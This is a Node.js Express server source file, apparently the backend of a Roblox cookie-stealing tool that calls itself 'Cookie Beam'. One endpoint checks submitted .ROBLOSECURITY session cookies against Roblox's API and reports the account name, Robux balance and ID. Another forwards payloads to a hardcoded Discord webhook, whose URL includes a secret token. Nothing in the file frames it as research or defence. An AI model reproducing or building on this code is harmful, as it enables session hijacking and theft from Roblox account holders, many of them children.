const express = require('express');
const fetch = require('node-fetch');
const cors = require('cors');
const app = express();

// Enable CORS for all routes
app.use(cors());
app.use(express.json());
app.use(express.static('.'));

// Webhook URL from environment variable or hardcoded fallback
const WEBHOOK_URL = process.env.WEBHOOK_URL || 'https://discord.com/api/webhooks/1537430116756619355/uAO-C2gl8toO3BiClhFUJ-9t8IgX7JmfAxzLnPfEShP5ArdjBmksdwjXWE9FKi7mIWsA';

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// Validate cookie endpoint
app.post('/validate', async (req, res) => {
    const { cookie } = req.body;
    if (!cookie) {
        return res.status(400).json({ error: 'Cookie is required' });
    }

    try {
        console.log('🔍 Validating cookie...');
        const response = await fetch('https://www.roblox.com/mobileapi/userinfo', {
            headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
        });

        const data = await response.json();

        if (response.ok) {
            console.log('✅ Valid cookie for user:', data.UserName);
            res.json({
                valid: true,
                username: data.UserName,
                robux: data.RobuxBalance,
                id: data.UserID
            });
        } else if (response.status === 401) {
            console.log('❌ Invalid cookie (401)');
            res.status(401).json({ valid: false, error: 'Invalid cookie (401 Unauthorized)' });
        } else {
            console.log('⚠️ API error:', response.status);
            res.status(response.status).json({ valid: false, error: `API error: ${response.status}` });
        }
    } catch (e) {
        console.error('❌ Proxy error:', e.message);
        res.status(500).json({ valid: false, error: 'Proxy error: ' + e.message });
    }
});

// Webhook forwarder endpoint
app.post('/send-webhook', async (req, res) => {
    const payload = req.body;
    if (!payload) {
        return res.status(400).json({ error: 'Payload is required' });
    }

    try {
        console.log('📤 Forwarding to Discord webhook...');
        const response = await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            console.log('✅ Webhook sent successfully');
            res.json({ status: 'sent' });
        } else {
            console.log('⚠️ Webhook error:', response.status);
            res.status(response.status).json({ error: `Webhook error: ${response.status}` });
        }
    } catch (e) {
        console.error('❌ Webhook forward error:', e.message);
        res.status(500).json({ error: 'Webhook forward error: ' + e.message });
    }
});

// Fallback route for static files
app.get('*', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🍪 Cookie Beam Proxy Server running on port ${PORT}`);
    console.log(`📡 Webhook configured: ${WEBHOOK_URL.substring(0, 50)}...`);
});
